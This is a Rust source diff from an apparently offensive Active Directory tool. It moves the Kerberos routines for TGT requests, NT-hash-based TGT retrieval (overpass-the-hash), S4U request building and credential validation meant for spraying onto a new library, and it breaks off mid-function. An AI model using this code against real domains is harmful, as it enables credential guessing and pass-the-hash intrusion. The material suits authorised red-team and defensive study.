@@ -14,31 +14,22 @@
 use crate::{format_tgs, kdc_exchange, krb_string, now_kerberos_time, principal, ETYPE_RC4_HMAC};
 use anyhow::{anyhow, bail, Context, Result};
 
+// picky-krb is still used by the not-yet-migrated AS-ccache path (asktgt / overpass_the_hash)
+// and the ticket-forge path (golden/silver/diamond + ccache). The AS/TGS/roast/S4U message +
+// crypto surface moved to kerbcore in the 1.5.3 swap.
 use picky_asn1::bit_string::BitString;
 use picky_asn1::wrapper::{
-    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag10,
-    ExplicitContextTag11, ExplicitContextTag2, ExplicitContextTag3, ExplicitContextTag4,
-    ExplicitContextTag5, ExplicitContextTag6, ExplicitContextTag7, ExplicitContextTag8,
-    GeneralStringAsn1, IntegerAsn1, OctetStringAsn1, Optional,
+    Asn1SequenceOf, BitStringAsn1, ExplicitContextTag0, ExplicitContextTag1, ExplicitContextTag2,
+    ExplicitContextTag3, ExplicitContextTag4, ExplicitContextTag5, ExplicitContextTag7,
+    ExplicitContextTag8, IntegerAsn1, OctetStringAsn1, Optional,
 };
-use picky_asn1_der::application_tag::ApplicationTag;
-use picky_krb::constants::key_usages::{AS_REP_ENC, TGS_REQ_PA_DATA_AP_REQ_AUTHENTICATOR};
+use picky_krb::constants::key_usages::AS_REP_ENC;
 use picky_krb::constants::types::{
-    AP_REQ_MSG_TYPE, AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_ENC_TIMESTAMP_KEY_USAGE,
-    TGS_REQ_MSG_TYPE,
+    AS_REQ_MSG_TYPE, NT_PRINCIPAL, NT_SRV_INST, PA_ENC_TIMESTAMP_KEY_USAGE,
 };
-use picky_krb::crypto::ChecksumSuite;
 use picky_krb::crypto::{Cipher, CipherSuite};
-use picky_krb::data_types::{
-    Authenticator, AuthenticatorInner, AuthorizationData, AuthorizationDataInner, EncTicketPart,
-    EncryptedData, EncryptionKey, EtypeInfo2, KerberosTime, PaData, PaEncTsEnc, PrincipalName,
-    Ticket, TicketInner, TransitedEncoding,
-};
-use picky_krb::data_types::{Checksum, PaPacOptions};
-use picky_krb::messages::{
-    ApReq, ApReqInner, AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, KrbError, TgsRep, TgsReq,
-};
-use serde::Serialize;
+use picky_krb::data_types::{EncryptedData, PaData, PaEncTsEnc, PrincipalName, Ticket};
+use picky_krb::messages::{AsRep, AsReq, EncAsRepPart, KdcReq, KdcReqBody, KrbError};
 
 /// Ticket-Granting Ticket plus the material needed to use it.
 ///
@@ -50,6 +41,10 @@ use serde::Serialize;
 pub struct Tgt {
     ticket: Ticket,
     session_key: Vec<u8>,
+    /// The session key's Kerberos enctype (RFC 3961 number). Carried on the wire in the AS-REP
+    /// `enc_part` (i.e. `part.key.keytype` after decrypt); 1.5.3 audit H-1 lifted this out of the
+    /// length-heuristic that was misidentifying AES128 (16-byte) session keys as RC4-HMAC.
+    session_etype: i32,
     cname: PrincipalName,
     crealm: String,
 }
@@ -59,6 +54,7 @@ impl std::fmt::Debug for Tgt {
         f.debug_struct("Tgt")
             .field("crealm", &self.crealm)
             .field("cname", &self.cname)
+            .field("session_etype", &self.session_etype)
             .field("session_key", &"***")
             .field("ticket", &"***")
             .finish()
@@ -67,34 +63,6 @@ impl std::fmt::Debug for Tgt {
 
 fn aes256() -> Box<dyn Cipher> {
     CipherSuite::Aes256CtsHmacSha196.cipher()
-}
-
-/// A session key is RC4 (etype 23) when it's 16 bytes, else AES256 (etype 18) — so ticket
-/// consumers can encrypt/decrypt the AP-REQ authenticator / TGS-REP with the matching cipher.
-fn session_etype(key: &[u8]) -> u8 {
-    if key.len() == 16 {
-        ETYPE_RC4_HMAC
-    } else {
-        crate::ETYPE_AES256
-    }
-}
-fn enc_session(key: &[u8], usage: i32, data: &[u8]) -> Result<Vec<u8>> {
-    if key.len() == 16 {
-        Ok(crate::rc4::encrypt(key, usage, data, None))
-    } else {
-        aes256()
-            .encrypt(key, usage, data)
-            .map_err(|e| anyhow!("encrypt (AES): {e}"))
-    }
-}
-fn dec_session(key: &[u8], usage: i32, ct: &[u8]) -> Result<Vec<u8>> {
-    if key.len() == 16 {
-        crate::rc4::decrypt(key, usage, ct).map_err(|e| anyhow!("decrypt (RC4): {e}"))
-    } else {
-        aes256()
-            .decrypt(key, usage, ct)
-            .map_err(|e| anyhow!("decrypt (AES): {e}"))
-    }
 }
 
 impl Tgt {
@@ -111,6 +79,10 @@ impl Tgt {
     }
     pub fn cname(&self) -> &PrincipalName {
         &self.cname
+    }
+    /// The session-key enctype (RFC 3961 number), tracked from the AS-REP reply key type.
+    pub fn session_etype(&self) -> i32 {
+        self.session_etype
     }
 }
 
@@ -170,120 +142,272 @@ fn build_as_req_etype(realm: &str, user: &str, padata: Option<PaData>, etype: u8
     }))
 }
 
-/// Pull the AES salt from a KRB-ERROR's ETYPE-INFO2 pre-auth hint; fall back to `default`.
-fn extract_salt(err: &KrbError, default: &str) -> String {
-    let Some(edata) = err.0.e_data.0.as_ref() else {
-        return default.to_string();
+/// Pull the AES salt AND PBKDF2 iteration count from a KRB-ERROR's ETYPE-INFO2 pre-auth hint.
+/// 1.5.3 audit M-4: `extract_salt` used to return only the salt and default 4096 iters —
+/// wrong for any KDC advertising `s2kparams` (Server 2019/2022 policy can set 32768+). Now
+/// decodes via kerbcore's `parse_etype_info2` and threads iters into `string_to_key`.
+/// Falls back to `(default_salt, default_iters)` on missing/malformed hint (KDC will
+/// KDC_ERR_PREAUTH_FAILED us cleanly if the defaults are wrong).
+fn extract_salt_and_iters(
+    krb_err_resp: &[u8],
+    default_salt: &str,
+    default_iters: u32,
+) -> (String, u32) {
+    let Ok(err) = kerbcore::messages::KrbError::decode(krb_err_resp) else {
+        return (default_salt.to_string(), default_iters);
     };
-    let Ok(padatas) =
-        picky_asn1_der::from_bytes::<picky_asn1::wrapper::Asn1SequenceOf<PaData>>(&edata.0 .0)
-    else {
-        return default.to_string();
+    let Some(edata) = err.e_data.as_ref() else {
+        return (default_salt.to_string(), default_iters);
     };
-    for pa in padatas.0 {
-        if pa.padata_type.0 .0 == vec![0x13] {
-            // PA-ETYPE-INFO2
-            if let Ok(info) = picky_asn1_der::from_bytes::<EtypeInfo2>(&pa.padata_data.0 .0) {
-                for entry in info.0 {
-                    if let Some(salt) = entry.salt.0.as_ref() {
-                        return String::from_utf8_lossy(salt.0.as_bytes()).into_owned();
-                    }
-                }
+    // e-data is a SEQUENCE OF PA-DATA (not itself wrapped in an OCTET STRING at this layer —
+    // KrbError::decode already unwrapped the outer OCTET STRING).
+    use kerbcore::der::{one_or, Der, TAG_SEQUENCE};
+    let Ok(seq) = one_or(edata, TAG_SEQUENCE) else {
+        return (default_salt.to_string(), default_iters);
+    };
+    let mut r = Der::new(seq);
+    while !r.is_empty() {
+        let Ok((_, item)) = r.read_tlv() else { break };
+        // Re-wrap item bytes as a full PaData SEQUENCE so PaData::decode reads it back.
+        let elem = kerbcore::der::tlv(TAG_SEQUENCE, item);
+        let Ok(pa) = kerbcore::types::PaData::decode(&elem) else {
+            continue;
+        };
+        if pa.padata_type != 19 {
+            // PA-ETYPE-INFO2 = 19
+            continue;
+        }
+        let Ok(entries) = kerbcore::client::parse_etype_info2(&pa.padata_value) else {
+            continue;
+        };
+        // Take the first entry that offers a salt (KDC lists preferred etype first).
+        for entry in &entries {
+            if let Some(salt) = entry.salt.as_deref() {
+                let iters = entry.s2k_iterations().unwrap_or(default_iters);
+                return (salt.to_string(), iters);
             }
         }
     }
-    default.to_string()
+    (default_salt.to_string(), default_iters)
+}
+
+// ── 1.5.3 kerbcore bridge helpers (temporary — removed once tgs.rs fully migrates) ──
+
+/// Far-future ticket expiry (`till`) as a kerbcore `KerberosTime` string. Matches the picky
+/// `far_future_time()` (2037-09-13) so behaviour is unchanged.
+const FAR_FUTURE: &str = "20370913024805Z";
+
+/// Current UTC as a kerbcore `KerberosTime` string (`YYYYMMDDHHMMSSZ`).
+fn now_krb_str() -> String {
+    use std::time::{SystemTime, UNIX_EPOCH};
+    let secs = SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_secs())
+        .unwrap_or(0);
+    kerbcore::client::unix_to_kerberos_time(secs)
+}
+
+/// Random positive 32-bit AS/TGS-REQ nonce.
+fn nonce_u32() -> u32 {
+    let mut n = [0u8; 4];
+    rand::RngCore::fill_bytes(&mut rand::thread_rng(), &mut n);
+    n[0] &= 0x7f; // keep the ASN.1 INTEGER positive
+    u32::from_be_bytes(n)
+}
+
+/// Bridge a kerbcore-decoded ticket back to a picky `Ticket` for the not-yet-migrated
+/// consumers (forge / ccache). kerbcore and picky DER are differential-tested byte-identical,
+/// so this round-trips losslessly. Deleted at K9.
+fn picky_ticket(kc: &kerbcore::messages::Ticket) -> Result<Ticket> {
+    picky_asn1_der::from_bytes::<Ticket>(&kc.encode())
+        .map_err(|e| anyhow!("bridge kerbcore->picky Ticket: {e}"))
+}
+
+/// Bridge a kerbcore `PrincipalName` → picky `PrincipalName` (for the still-picky `Tgt.cname`).
+/// Deleted at K9 when `Tgt` flips to kerbcore types.
+fn picky_cname(kc: &kerbcore::types::PrincipalName) -> Result<PrincipalName> {
+    picky_asn1_der::from_bytes::<PrincipalName>(&kc.encode())
+        .map_err(|e| anyhow!("bridge kerbcore->picky PrincipalName: {e}"))
+}
+
+/// Bridge the picky `Tgt.ticket` → kerbcore `Ticket` (reverse DER round-trip). Deleted at K9.
+fn kc_ticket_of(tgt: &Tgt) -> Result<kerbcore::messages::Ticket> {
+    kerbcore::messages::Ticket::decode(&picky_asn1_der::to_vec(&tgt.ticket)?)
+        .map_err(|e| anyhow!("bridge picky->kerbcore Ticket: {e:?}"))
+}
+
+/// Typed TGT session key using the tracked AS-REP `session_etype` (1.5.3 audit H-1 — the prior
+/// length-heuristic mis-typed AES128 sessions as RC4).
+fn kc_session_key_of(tgt: &Tgt) -> Result<kerbcore::KerberosKey> {
+    kerbcore::KerberosKey::from_i32(tgt.session_etype, tgt.session_key.clone())
+        .map_err(|e| anyhow!("TGT session key (etype {}): {e}", tgt.session_etype))
+}
+
+/// Typed service-ticket session key using the tracked TGS-REP `session_etype`.
+fn kc_service_key_of(st: &ServiceTicket) -> Result<kerbcore::KerberosKey> {
+    kerbcore::KerberosKey::from_i32(st.session_etype, st.session_key.clone()).map_err(|e| {
+        anyhow!(
+            "service ticket session key (etype {}): {e}",
+            st.session_etype
+        )
+    })
+}
+
+/// Bridge the picky `Tgt.cname` → kerbcore `PrincipalName`. Deleted at K9.
+fn kc_cname_of(tgt: &Tgt) -> Result<kerbcore::types::PrincipalName> {
+    kerbcore::types::PrincipalName::decode(&picky_asn1_der::to_vec(&tgt.cname)?)
+        .map_err(|e| anyhow!("bridge picky->kerbcore cname: {e:?}"))
+}
+
+/// Hand-assemble a TGS-REQ (kerbcore `messages`) with arbitrary padata, an optional additional
+/// ticket (S4U2Proxy), and explicit `kdc_options`. kerbcore's `client::build_tgs_req` only emits
+/// the plain PA-TGS-REQ authenticator; S4U needs extra padata (PA-FOR-USER / PA-PAC-OPTIONS) and
+/// the additional-ticket field, so adhammer composes it here on kerbcore's `messages`/`der`
+/// (offensive composition stays in adhammer per kerbcore's dual-use rule).
+/// 1.5.3 audit H-2: encode the KDC-REQ-BODY FIRST, hand its DER to `build_pa_tgs_req` so the
+/// AP-REQ authenticator can checksum it (RFC 4120 §3.3.2), then splice the PA-TGS-REQ padata
+/// (+ any extra padata like PA-FOR-USER / PA-PAC-OPTIONS) into the outer TGS-REQ.
+fn build_s4u_tgs_req(
+    realm: &str,
+    sname: &kerbcore::types::PrincipalName,
+    kdc_options: u32,
+    additional: Option<&kerbcore::messages::Ticket>,
+    etypes: &[i32],
+    build_pa_tgs_req: impl FnOnce(&[u8]) -> Result<kerbcore::types::PaData>,
+    extra_padata: Vec<kerbcore::types::PaData>,
+) -> Result<Vec<u8>> {
+    // additional-tickets [11] content is `SEQUENCE OF Ticket`.
+    let additional_tickets = additional.map(|t| kerbcore::der::encode_sequence(&t.encode()));
+    let body = kerbcore::messages::KdcReqBody {
+        kdc_options,
+        cname: None, // identity comes from the ticket
+        realm: realm.to_string(),
+        sname: Some(sname.clone()),
+        from: None,
+        till: kerbcore::types::KerberosTime(FAR_FUTURE.to_string()),
+        rtime: None,
+        nonce: nonce_u32(),
+        etypes: etypes.to_vec(),
+        addresses: None,
+        enc_authorization_data: None,
+        additional_tickets,
+    };
+    let body_der = body.encode();
+    let mut padata = Vec::with_capacity(1 + extra_padata.len());
+    padata.push(build_pa_tgs_req(&body_der)?);
+    padata.extend(extra_padata);
+    Ok(kerbcore::messages::KdcReq {
+        msg_type: 12,
+        padata,
+        req_body: body,
+    }
+    .encode())
 }
 
 /// AS-REP roast a TGT via the two-step AS exchange: first an un-authenticated AS-REQ to
 /// learn the real salt (ETYPE-INFO2), then an AS-REQ with PA-ENC-TIMESTAMP.
+///
+/// 1.5.3 kerbcore swap: the AS crypto (string-to-key, PA-ENC-TIMESTAMP seal, AS-REP decrypt,
+/// session-key extract) + message build/parse run on `kerbcore`; salt + s2kparams iteration
+/// count come from [`extract_salt_and_iters`] (also on kerbcore, 1.5.3 audit M-4). The ticket
+/// is bridged back to a picky `Ticket` ([`picky_ticket`]) for the not-yet-migrated `Tgt` consumers.
 pub async fn get_tgt(user: &str, password: &str, realm: &str, kdc: &str) -> Result<Tgt> {
     let realm = realm.to_uppercase();
-    let cipher = aes256();
     // The Kerberos client principal is the bare sAMAccountName — strip any UPN suffix
     // (user@realm) or NetBIOS prefix (DOMAIN\user) that came from the LDAP bind identity.
     let user = user.split('@').next().unwrap_or(user);
     let user = user.rsplit('\\').next().unwrap_or(user);
     let default_salt = format!("{realm}{user}");
+    let cname_kc = kerbcore::client::client_cname(user);
     tracing::debug!(
-        user, realm = %realm, kdc, cipher = "aes256-cts-hmac-sha1-96",
+        user, realm = %realm, kdc, cipher = "aes256-cts-hmac-sha1-96 (kerbcore)",
         "get_tgt: AS-REQ round-trip start"
     );
 
     // Step 1 — no pre-auth: expect KRB-ERROR(25 = PREAUTH_REQUIRED) carrying ETYPE-INFO2.
-    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
-        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
+    let raw1 = kerbcore::client::build_as_req(
+        &realm,
+        &cname_kc,
+        nonce_u32(),
+        FAR_FUTURE,
+        &[crate::ETYPE_AES256 as i32],
+        Vec::new(),
+    );
     tracing::trace!(bytes = raw1.len(), "AS-REQ#1 sent (no pre-auth)");
     let resp1 = kdc_exchange(kdc, &raw1).await?;
     tracing::trace!(bytes = resp1.len(), "AS-REQ#1 response");
-    let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
-        default_salt.clone() // pre-auth not required (rare)
+    // 1.5.3 audit M-4: salt + s2kparams iteration count via kerbcore's parse_etype_info2 (was
+    // picky, dropped s2kparams — a non-4096 KDC broke pre-auth silently).
+    let (salt, iters) = if kerbcore::messages::KdcRep::decode(&resp1).is_ok() {
+        (default_salt.clone(), 4096) // pre-auth not required (rare)
     } else {
-        match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
-            Ok(err) => {
-                let code = err.0.error_code.0;
-                if code != 25 {
-                    bail!("KDC error {code} on initial AS-REQ");
-                }
-                extract_salt(&err, &default_salt)
-            }
-            Err(e) => bail!("unexpected AS response: {e}"),
+        match kerbcore::messages::KrbError::decode(&resp1) {
+            Ok(err) if err.error_code == 25 => extract_salt_and_iters(&resp1, &default_salt, 4096),
+            Ok(err) => bail!("KDC error {} on initial AS-REQ", err.error_code),
+            Err(e) => bail!("unexpected AS response: {e:?}"),
         }
     };
 
-    let key = cipher
-        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
-        .map_err(|e| anyhow!("derive AES key: {e}"))?;
+    // AES256 string-to-key with the iteration count the KDC advertised (or RFC 3962 default 4096).
+    let key = kerbcore::KerberosKey::string_to_key(
+        kerbcore::Enctype::Aes256CtsHmacSha1_96,
+        password,
+        salt.as_bytes(),
+        iters,
+    );
 
-    // Step 2 — AS-REQ with PA-ENC-TIMESTAMP encrypted under the derived key.
-    let ts = PaEncTsEnc {
-        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
-        pausec: Optional::from(None),
+    // Step 2 — AS-REQ with PA-ENC-TIMESTAMP encrypted under the derived key (usage 1).
+    let ts_der = kerbcore::client::encode_pa_enc_ts_enc(&now_krb_str(), 0);
+    let enc_ts = key.encrypt(kerbcore::client::KU_AS_REQ_PA_ENC_TS, &ts_der);
+    let ed = kerbcore::types::EncryptedData {
+        etype: crate::ETYPE_AES256 as i32,
+        kvno: None,
+        cipher: enc_ts,
     };
-    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
-    let enc_ts = cipher
-        .encrypt(&key, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der)
-        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
-    let padata = PaData {
-        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
-        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
-            picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts))
-                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
-        )),
-    };
-    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata))?)
-        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
+    let padata = kerbcore::client::pa_enc_timestamp(&ed);
+    let raw2 = kerbcore::client::build_as_req(
+        &realm,
+        &cname_kc,
+        nonce_u32(),
+        FAR_FUTURE,
+        &[crate::ETYPE_AES256 as i32],
+        vec![padata],
+    );
     tracing::trace!(bytes = raw2.len(), "AS-REQ#2 sent (with PA-ENC-TIMESTAMP)");
     let resp2 = kdc_exchange(kdc, &raw2).await?;
     tracing::trace!(bytes = resp2.len(), "AS-REQ#2 response");
-    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp2).map_err(|e| {
-        match picky_asn1_der::from_bytes::<KrbError>(&resp2) {
+    let as_rep = kerbcore::messages::KdcRep::decode(&resp2).map_err(|e| {
+        match kerbcore::messages::KrbError::decode(&resp2) {
             Ok(err) => {
-                let code = err.0.error_code.0;
-                tracing::warn!(code, "KDC rejected pre-auth AS-REQ");
-                anyhow!("pre-auth AS-REQ rejected, KDC error {code}")
+                tracing::warn!(code = err.error_code, "KDC rejected pre-auth AS-REQ");
+                anyhow!("pre-auth AS-REQ rejected, KDC error {}", err.error_code)
             }
-            Err(_) => anyhow!("AS-REP decode: {e}"),
+            Err(_) => anyhow!("AS-REP decode: {e:?}"),
         }
     })?;
 
-    let enc = &as_rep.0.enc_part.0;
-    let plain = cipher
-        .decrypt(&key, AS_REP_ENC, &enc.cipher.0 .0)
+    // Decrypt the AS-REP enc-part (usage 3) → EncKDCRepPart → session key.
+    let plain = key
+        .decrypt(
+            kerbcore::client::KU_AS_REP_ENC_PART,
+            &as_rep.enc_part.cipher,
+        )
         .map_err(|e| anyhow!("decrypt AS-REP: {e}"))?;
-    let enc_part: EncAsRepPart =
-        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
-    let session_key = enc_part.0.key.0.key_value.0 .0.clone();
+    let part = kerbcore::client::parse_enc_kdc_rep_part(&plain)
+        .map_err(|e| anyhow!("EncAsRepPart decode: {e:?}"))?;
+    let session_key = part.key.keyvalue;
     tracing::debug!(
         session_key_len = session_key.len(),
-        etype = enc.etype.0 .0.first().copied().unwrap_or(0),
-        "TGT acquired"
+        etype = as_rep.enc_part.etype,
+        "TGT acquired (kerbcore)"
     );
 
     Ok(Tgt {
-        ticket: as_rep.0.ticket.0.clone(),
+        ticket: picky_ticket(&as_rep.ticket)?,
         session_key,
-        cname: as_rep.0.cname.0.clone(),
+        // 1.5.3 audit H-1: track the real session-key etype from EncKDCRepPart.key.keytype.
+        session_etype: part.key.keytype,
+        cname: principal(NT_PRINCIPAL, &[user])?,
         crealm: realm,
     })
 }
@@ -315,10 +439,12 @@ pub async fn asktgt(user: &str, realm: &str, kdc: &str, password: &str) -> Resul
     let salt = if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
         default_salt.clone()
     } else {
-        match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
-            Ok(err) => extract_salt(&err, &default_salt),
-            Err(e) => bail!("unexpected AS response: {e}"),
-        }
+        // 1.5.3 audit M-4: use kerbcore's parse_etype_info2; picky's string_to_key inside
+        // `cipher.generate_key_from_password` hardcodes 4096 iterations, so the returned iters
+        // count is dropped here (this path is the still-picky asktgt tail — full s2kparams
+        // support arrives when asktgt migrates to kerbcore, at which point iters land too).
+        let (s, _iters) = extract_salt_and_iters(&resp1, &default_salt, 4096);
+        s
     };
     let key = cipher
         .generate_key_from_password(password.as_bytes(), salt.as_bytes())
@@ -373,43 +499,52 @@ pub async fn get_tgt_by_hash(user: &str, realm: &str, kdc: &str, nt: &[u8; 16]) 
     let realm = realm.to_uppercase();
     let user = user.split('@').next().unwrap_or(user);
     let user = user.rsplit('\\').next().unwrap_or(user);
-    let etype = ETYPE_RC4_HMAC;
+    let cname_kc = kerbcore::client::client_cname(user);
 
-    let ts = PaEncTsEnc {
-        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
-        pausec: Optional::from(None),
+    // The NT hash *is* the RC4-HMAC Kerberos key (etype 23) — no salt/string-to-key.
+    let key = kerbcore::KerberosKey::from_i32(ETYPE_RC4_HMAC as i32, nt.to_vec())
+        .map_err(|e| anyhow!("RC4 key from NT hash: {e}"))?;
+    let ts_der = kerbcore::client::encode_pa_enc_ts_enc(&now_krb_str(), 0);
+    let enc_ts = key.encrypt(kerbcore::client::KU_AS_REQ_PA_ENC_TS, &ts_der);
+    let ed = kerbcore::types::EncryptedData {
+        etype: ETYPE_RC4_HMAC as i32,
+        kvno: None,
+        cipher: enc_ts,
     };
-    let ts_der = picky_asn1_der::to_vec(&ts).map_err(|e| anyhow!("encode PA-TS: {e}"))?;
-    let enc_ts = crate::rc4::encrypt(nt, PA_ENC_TIMESTAMP_KEY_USAGE, &ts_der, None);
-    let padata = PaData {
-        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
-        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
-            picky_asn1_der::to_vec(&encrypted_data(etype, enc_ts))
-                .map_err(|e| anyhow!("encode PA-TS ED: {e}"))?,
-        )),
-    };
-    let raw = picky_asn1_der::to_vec(&build_as_req_etype(&realm, user, Some(padata), etype)?)
-        .map_err(|e| anyhow!("encode AS-REQ: {e}"))?;
+    let padata = kerbcore::client::pa_enc_timestamp(&ed);
+    let raw = kerbcore::client::build_as_req(
+        &realm,
+        &cname_kc,
+        nonce_u32(),
+        FAR_FUTURE,
+        &[ETYPE_RC4_HMAC as i32],
+        vec![padata],
+    );
     let resp = kdc_exchange(kdc, &raw).await?;
-    let as_rep: AsRep = picky_asn1_der::from_bytes(&resp).map_err(|e| {
-        match picky_asn1_der::from_bytes::<KrbError>(&resp) {
+    let as_rep = kerbcore::messages::KdcRep::decode(&resp).map_err(|e| {
+        match kerbcore::messages::KrbError::decode(&resp) {
             Ok(err) => anyhow!(
                 "AS-REQ rejected, KDC error {} (RC4 disabled on this DC? — RC4 is off by default on Server 2025)",
-                err.0.error_code.0
+                err.error_code
             ),
-            Err(_) => anyhow!("AS-REP decode: {e}"),
+            Err(_) => anyhow!("AS-REP decode: {e:?}"),
         }
     })?;
-    let enc = &as_rep.0.enc_part.0;
-    let plain = crate::rc4::decrypt(nt, AS_REP_ENC, &enc.cipher.0 .0)
+    let plain = key
+        .decrypt(
+            kerbcore::client::KU_AS_REP_ENC_PART,
+            &as_rep.enc_part.cipher,
+        )
         .map_err(|e| anyhow!("decrypt AS-REP (RC4): {e}"))?;
-    let enc_part: EncAsRepPart =
-        picky_asn1_der::from_bytes(&plain).map_err(|e| anyhow!("EncAsRepPart decode: {e}"))?;
-    let session_key = enc_part.0.key.0.key_value.0 .0.clone();
+    let part = kerbcore::client::parse_enc_kdc_rep_part(&plain)
+        .map_err(|e| anyhow!("EncAsRepPart decode: {e:?}"))?;
+    // 1.5.3 audit H-1: `keytype` is authoritative — RC4 AS-REP over the NT-hash key stays 23.
+    let session_etype = part.key.keytype;
     Ok(Tgt {
-        ticket: as_rep.0.ticket.0.clone(),
-        session_key,
-        cname: as_rep.0.cname.0.clone(),
+        ticket: picky_ticket(&as_rep.ticket)?,
+        session_key: part.key.keyvalue,
+        session_etype,
+        cname: principal(NT_PRINCIPAL, &[user])?,
         crealm: realm,
     })
 }
@@ -472,6 +607,10 @@ pub enum CredResult {
     NoPreAuth,       // DONT_REQ_PREAUTH — AS-REP roastable, password not verifiable this way
     NoSuchUser,      // C_PRINCIPAL_UNKNOWN — account does not exist
     Other(u32),
+    /// 1.5.3 audit L-2: KDC reply was neither a valid AS-REP nor a KRB-ERROR (malformed / probe
+    /// tampering / MITM). Distinct from `Other(0)` (which was a code-0 collision) so a spraying
+    /// caller can classify "bogus wire" separately from "KDC error code 0".
+    Malformed,
 }
 
 /// Validate one credential via a Kerberos AS pre-auth exchange (no LDAP needed). The KDC
@@ -483,159 +622,122 @@ pub async fn check_credential(
     kdc: &str,
 ) -> Result<CredResult> {
     let realm = realm.to_uppercase();
-    let cipher = aes256();
     let user = user.split('@').next().unwrap_or(user);
     let user = user.rsplit('\\').next().unwrap_or(user);
     let default_salt = format!("{realm}{user}");
+    let cname_kc = kerbcore::client::client_cname(user);
 
     // Step 1 — no pre-auth: classify by response.
-    let raw1 = picky_asn1_der::to_vec(&build_as_req(&realm, user, None)?)
-        .map_err(|e| anyhow!("encode AS-REQ#1: {e}"))?;
+    let raw1 = kerbcore::client::build_as_req(
+        &realm,
+        &cname_kc,
+        nonce_u32(),
+        FAR_FUTURE,
+        &[crate::ETYPE_AES256 as i32],
+        Vec::new(),
+    );
     let resp1 = kdc_exchange(kdc, &raw1).await?;
-    if picky_asn1_der::from_bytes::<AsRep>(&resp1).is_ok() {
+    if kerbcore::messages::KdcRep::decode(&resp1).is_ok() {
         return Ok(CredResult::NoPreAuth); // pre-auth not required for this account
     }
-    let salt = match picky_asn1_der::from_bytes::<KrbError>(&resp1) {
-        Ok(err) => match err.0.error_code.0 {
-            25 => extract_salt(&err, &default_salt), // PREAUTH_REQUIRED — normal
+    // 1.5.3 audit M-4: salt + s2kparams iters via kerbcore's parse_etype_info2.
+    let (salt, iters) = match kerbcore::messages::KrbError::decode(&resp1) {
+        Ok(err) => match err.error_code {
+            25 => extract_salt_and_iters(&resp1, &default_salt, 4096), // PREAUTH_REQUIRED — normal
             6 => return Ok(CredResult::NoSuchUser),
-            c => return Ok(CredResult::Other(c)),
+            c => return Ok(CredResult::Other(c as u32)),
         },
-        Err(e) => bail!("unexpected AS response: {e}"),
+        Err(e) => bail!("unexpected AS response: {e:?}"),
     };
 
-    // Step 2 — pre-auth with the candidate password.
-    let key = cipher
-        .generate_key_from_password(password.as_bytes(), salt.as_bytes())
-        .map_err(|e| anyhow!("derive key: {e}"))?;
-    let ts = PaEncTsEnc {
-        patimestamp: ExplicitContextTag0::from(now_kerberos_time()),
-        pausec: Optional::from(None),
+    // Step 2 — pre-auth with the candidate password (AES256, KDC-advertised or default 4096 iters).
+    let key = kerbcore::KerberosKey::string_to_key(
+        kerbcore::Enctype::Aes256CtsHmacSha1_96,
+        password,
+        salt.as_bytes(),
+        iters,
+    );
+    let ts_der = kerbcore::client::encode_pa_enc_ts_enc(&now_krb_str(), 0);
+    let enc_ts = key.encrypt(kerbcore::client::KU_AS_REQ_PA_ENC_TS, &ts_der);
+    let ed = kerbcore::types::EncryptedData {
+        etype: crate::ETYPE_AES256 as i32,
+        kvno: None,
+        cipher: enc_ts,
     };
-    let enc_ts = cipher
-        .encrypt(
-            &key,
-            PA_ENC_TIMESTAMP_KEY_USAGE,
-            &picky_asn1_der::to_vec(&ts).unwrap(),
-        )
-        .map_err(|e| anyhow!("encrypt PA-TS: {e}"))?;
-    let padata = PaData {
-        padata_type: ExplicitContextTag1::from(IntegerAsn1(vec![0x02])),
-        padata_data: ExplicitContextTag2::from(OctetStringAsn1(
-            picky_asn1_der::to_vec(&encrypted_data(crate::ETYPE_AES256, enc_ts)).unwrap(),
-        )),
-    };
-    let raw2 = picky_asn1_der::to_vec(&build_as_req(&realm, user, Some(padata))?)
-        .map_err(|e| anyhow!("encode AS-REQ#2: {e}"))?;
+    let padata = kerbcore::client::pa_enc_timestamp(&ed);
+    let raw2 = kerbcore::client::build_as_req(
+        &realm,
+        &cname_kc,
+        nonce_u32(),
+        FAR_FUTURE,
+        &[crate::ETYPE_AES256 as i32],
+        vec![padata],
+    );
     let resp2 = kdc_exchange(kdc, &raw2).await?;
 
-    if picky_asn1_der::from_bytes::<AsRep>(&resp2).is_ok() {
+    if kerbcore::messages::KdcRep::decode(&resp2).is_ok() {
         return Ok(CredResult::Valid);
     }
-    Ok(match picky_asn1_der::from_bytes::<KrbError>(&resp2) {
-        Ok(err) => match err.0.error_code.0 {
+    Ok(match kerbcore::messages::KrbError::decode(&resp2) {
+        Ok(err) => match err.error_code {
             24 => CredResult::Invalid,         // PREAUTH_FAILED
             18 => CredResult::Disabled,        // CLIENT_REVOKED
             23 => CredResult::ValidButExpired, // KEY_EXPIRED
             6 => CredResult::NoSuchUser,
-            c => CredResult::Other(c),
+            c => CredResult::Other(c as u32),
         },
-        Err(_) => CredResult::Other(0),
+        // 1.5.3 audit L-2: distinct from Other(0) which would collide with KDC-error-code=0.
